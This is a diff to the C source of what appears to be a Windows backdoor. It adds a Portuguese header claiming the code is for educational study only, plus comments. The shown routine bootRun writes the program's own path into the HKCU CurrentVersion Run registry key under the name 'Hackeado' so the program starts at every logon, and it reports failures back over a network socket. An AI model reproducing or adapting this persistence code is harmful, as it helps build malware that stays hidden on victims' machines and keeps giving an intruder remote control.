@@ -1,3 +1,11 @@
+/*
+Criado por Jean(Kripto-Sec) estudante de segurança da informação
+Criado apenas para fins educativos não use para beneficio proprio
+Apenas para estudo 
+github: https://github.com/Kripto-Sec
+bom estudo
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -29,12 +37,13 @@ int bootRun()
     }
 
     HKEY NewVal;
-
+    //quando chamado cria um NewVal Hkey onde a persistencia sera inserida
     if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
         send(sock, err, sizeof(err), 0);
         return -1;
     }
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+    //caso queira modifique o campo "TEXT" para o nome de sua preferencia
     if (RegSetValueEx(NewVal, TEXT("Hackeado"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
         RegCloseKey(NewVal);
         send(sock, err, sizeof(err), 0);
